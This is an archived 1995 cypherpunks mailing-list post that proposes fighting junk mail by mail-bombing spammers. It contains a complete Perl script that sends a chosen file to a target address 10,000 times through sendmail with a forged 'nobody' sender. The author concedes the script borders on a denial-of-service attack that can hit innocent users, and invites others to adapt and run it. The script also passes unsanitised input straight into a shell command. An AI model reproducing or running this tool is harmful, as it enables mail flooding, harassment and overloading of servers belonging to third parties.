@@ -1,0 +1,38 @@
+From: Ford Prefect <remailer@bi-node.zerberus.de>
+Date: Fri, 29 Sep 95 18:34:21 PDT
+To: cypherpunks@toad.com
+Subject: Re: Electronic junk mail (one solution)
+Message-ID: <m0syqoP-0002ThC@bi-node.zerberus.de>
+MIME-Version: 1.0
+Content-Type: text/plain
+
+
+OK...I know this borders on a "denial of service" attack since it may 
+effect innocent users. How would you like to be the one to explain to  
+your System Administrator that the Megabytes of returned Spam on the 
+disk are yours? 
+I realize that some peoples implementations of Sendmail will tell who
+your are regardless, so you might have to modify the "system" line for
+your own tastes. Also you might *not* want to be anon. Please feel
+free to modify to your own tastes. The delay loop is to space out 
+the load. I also tried it with premail instead of Sendmail and it
+went thru the remailers just fine. It should be capable of running 
+in the background. Only took 5 minutes to write and a couple of 
+remailers to test.
+============================================================
+#!/usr/bin/perl
+print "Who does this go to?: ";
+chop($name = <STDIN>);
+print "What is the filename to send?: ";
+chop($filename = <STDIN>);
+for ($a=0;$a<100;$a++) {
+for ($b=0;$b<100;$b++) {
+system ("/usr/lib/sendmail -f nobody $name < $filename");
+for ($x=0;$x<600000;$x++){};
+}
+}
+============================================================
+
+
+
+
